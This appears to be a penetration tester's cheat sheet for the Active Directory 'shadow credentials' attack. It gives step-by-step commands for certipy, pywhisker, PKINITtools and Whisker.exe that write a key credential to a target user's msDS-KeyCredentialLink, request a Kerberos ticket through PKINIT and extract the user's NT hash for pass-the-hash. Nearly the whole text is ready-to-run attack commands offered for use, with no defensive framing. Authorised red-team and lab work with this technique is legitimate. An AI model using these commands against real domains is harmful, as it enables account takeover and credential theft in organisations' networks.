With shadow credentials attack you can get the NT hash from a target user. Then use it for pass-the-hash.
Requirements are rights enought to write in msDS-KeyCredentialLink and PKINIT enable in kerberos.
Check bloodhound sudgestions to know if this attack vector is available in your case.

# ABUSING SHADOW CREDENTIALS FROM OUTSIDE (from linux):
____________________________________________________


## SHADOW CREDENTIALS ATTACK (with certipy, RECOMENDED):

 * REQUIREMENTS: Get certipy (or certipy-ad in kali) AND UPDATE IT to the last version -> https://github.com/ly4k/Certipy/wiki/04-%E2%80%90-Installation

 You can do this attack with password or NT Hash wit pass the hash technique:
 
` < kerberos sync clock > ; certipy shadow auto -u <user you control>@<domain> -p <password> -account <target user> `

` < kerberos sync clock > ; certipy shadow auto -u <user you control>@<domain> -hashes :<your user NT hash here> -account <target user> `


## SHADOW CREDENTIALS ATTACK (old school method, with pywisker):

 * REQUIREMENTS: Get pywhisker, "gettgtpkinit.py" and "getnthash.py" from this repositoris:
   
     https://github.com/ShutdownRepo/pywhisker?tab=readme-ov-file
   
     https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py
   
     https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py



` pywhisker -d "< domain >" -u "< user you control>" -p "< password >" --target "<target user>" --action "add" `

` < kerberos sync clock > ; gettgtpkinit.py -cert-pfx <cert from previous command>.pfx -pfx-pass <pass from previous command> <domain>/<user you control> <target user>.ccache `

` export KRB5CCNAME=<target user>.ccache `

` getnthash.py -key <key obtanined from previous command> <domain>/<target user> `



# ABUSING SHADOW CREDENTIALS FROM INSIDE (windows abuse):
______________________________________________________


## SHADOW CREDENTIALS ATTACK (with whisker.exe):

 Upload Whisker.exe to the target machine and execute:
  ` ./Whisker.exe add /target:<target user> `

 This will gieve you certificate and cert. password, then you can use it outside with gettgtpkinit.py and getnthash.py as above.


 You can also list targeted users:
  ` ./Whisker.exe list /target:<target user> `

 You can also remove targets from msDS-KeyCredentialLink
  ` ./Whisker.exe remove /target:<target user> `


